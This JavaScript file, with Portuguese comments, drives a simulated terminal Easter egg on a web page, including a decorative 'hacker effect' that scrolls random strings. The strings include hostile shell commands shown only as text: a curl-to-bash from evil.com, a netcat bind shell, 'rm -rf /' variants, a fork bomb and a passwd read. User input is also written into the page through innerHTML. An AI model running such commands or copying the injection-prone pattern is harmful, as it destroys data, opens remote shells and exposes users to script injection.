document.addEventListener('keydown', function(event) {
    if (event.shiftKey && event.key === 'T') {
        event.preventDefault();
        document.getElementById('backgroundCodes').innerHTML = ""
        openAndToggleTerminal();
    }
});

function handleKeyDown(event) {
    if (event.key === "Enter") {
        sendCommand();
    }
}

function sendCommand() {
    const inputElement = document.getElementById('terminalInput');
    const command = inputElement.value;
    const outputElement = document.getElementById('terminalOutput');

    // Limpa o campo de entrada
    inputElement.value = '';

    // Adiciona o comando ao terminal
    const commandLine = document.createElement('div');
    commandLine.className = 'terminal-line command-line';
    commandLine.innerHTML = `<span class="prompt">user@linux:~$</span> <span>${command}</span>`;
    outputElement.appendChild(commandLine);

    // Executa o comando (simulado)
    switch (command.trim()) {
        case 'hello':
            outputElement.appendChild(createTerminalOutput('Hello, world!'));
            break;
        case 'date':
            outputElement.appendChild(createTerminalOutput(new Date().toLocaleString()));
            break;
        case 'help':
            outputElement.appendChild(createTerminalOutput('Lista de comandos:'));
            outputElement.appendChild(createTerminalOutput('- hello: exibe "Hello, world!"'));
            outputElement.appendChild(createTerminalOutput('- date: exibe a data e hora atuais'));
            outputElement.appendChild(createTerminalOutput('- help: exibe esta lista de comandos'));
            outputElement.appendChild(createTerminalOutput('- clear: limpa a tela'));
            outputElement.appendChild(createTerminalOutput('- exit: fecha o terminal'));
            break;
        case 'clear':
            outputElement.innerHTML = '';
            break;
        case 'exit':
            closeTerminal();
            break;
        default:
            outputElement.appendChild(createTerminalOutput('Comando não reconhecido'));
    }

    // Rola até o final do terminal
    outputElement.scrollTop = outputElement.scrollHeight;
}

function createTerminalOutput(text) {
    const outputLine = document.createElement('div');
    outputLine.className = 'terminal-line command-line';
    outputLine.innerHTML = text;
    return outputLine;
}

let hackerEffectInterval;

function openTerminal() {
    document.getElementById('overlay').style.display = 'block';
    document.getElementById('terminalModal').style.display = 'block';
    document.getElementById('backgroundCodes').innerHTML = ""; // Limpa o conteúdo anterior
    startHackerEffect();
}

function closeTerminal() {
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('terminalModal').style.display = 'none';
    document.getElementById('backgroundCodes').innerHTML = ""; // Limpa o conteúdo anterior
    stopHackerEffect();
}

function startHackerEffect() {
    hackerEffectInterval = setInterval(function() {
        const backgroundCodes = document.getElementById('backgroundCodes');
        const randomCode = generateRandomCode();
        const codeLine = document.createElement('div');
        codeLine.textContent = randomCode;
        backgroundCodes.appendChild(codeLine);
        backgroundCodes.scrollTop = backgroundCodes.scrollHeight;
    }, 100);
}

function stopHackerEffect() {
    clearInterval(hackerEffectInterval);
}

let terminalOpen = false;

function generateRandomCode() {
    const codeExamples = [
        // Comandos de sistema
        "sudo rm -rf /*",
        "cd /etc && cat passwd",
        "wget -O /dev/null http://example.com/some-file.tar.gz",
        "ssh root@somewhere -p 2222",
        "nc -lvp 4444 -e /bin/bash",
        "curl -L https://evil.com | bash",
        "echo '1' > /proc/sys/net/ipv4/ip_forward",
        "cat /dev/random | hexdump -C | grep 'de ad be ef'",
        "sudo apt-get install malware",
        "echo 'password' | sudo -S shutdown now",
        "chmod -R 777 /",
        "find / -name '*.jpg' -exec rm {} \\;",

        // Comandos de rede
        "ping -c 5 google.com",
        "traceroute example.com",
        "nmap -A -T4 192.168.1.1",
        "tcpdump -i eth0 -n -s0 -w packet_capture.pcap",
        "ipconfig /all",
        "netstat -ano",
        "arp -a",
        "ssh -L 8080:localhost:80 user@example.com",

        // Scripts maliciosos
        "while true; do cat /dev/urandom > /dev/null; done",
        "fork-bomb() { fork-bomb | fork-bomb & }; fork-bomb",
        "rm -rf / --no-preserve-root",
        "echo 'while true; do x=$((RANDOM%1024)); y=$((RANDOM%768));xdotool mousemove $x $y; sleep 0.1;done' | bash",
        "while true; do printf '%*c' $((RANDOM%1024)) $((RANDOM%128)) > /dev/null; done",
        "while true; do echo $((RANDOM%9999999)) > /dev/null; done"
    ];

    // Seleciona aleatoriamente um dos exemplos de código
    const randomIndex = Math.floor(Math.random() * codeExamples.length);
    const code = codeExamples[randomIndex];

    // Simular indentação adicionando espaços extras no início de cada linha
    const indentedCode = code.split("\n").map(line => "    " + line).join("\n");

    return indentedCode;
}

function displayRandomCode() {
    const code = generateRandomCode();
    document.getElementById('backgroundCodes').innerHTML = code;
}

function toggleTerminal() {
    terminalOpen = !terminalOpen;
    if (terminalOpen) {
        displayRandomCode();
    }
}

function openAndToggleTerminal() {
    openTerminal();
    toggleTerminal();
}